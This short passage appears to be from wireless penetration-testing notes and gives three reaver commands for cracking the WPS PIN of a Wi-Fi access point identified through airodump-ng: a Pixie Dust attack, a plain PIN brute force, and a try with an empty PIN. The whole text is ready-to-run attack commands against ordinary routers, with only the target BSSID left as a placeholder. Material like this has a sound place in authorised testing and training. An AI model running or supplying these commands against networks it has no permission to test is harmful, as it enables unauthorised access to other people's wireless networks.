> If we see WPS 2.0 in our Airodump-ng output we can try and crack the WPS PIN using reaver. We will need the BSSID:

```
sudo reaver -i wlan0mon -b <bssid> -K -vv
```

> If this fails then we can try the same command without -k for a regular PIN bruteforce:

```
sudo reaver -i wlan0mon -b <bssid> -vv
```

> If the WPS shows 1.0 we can see if no pin is configured on the AP by appending:

```
sudo reaver -i wlan0mon -b <bssid> -p '' -vv
```




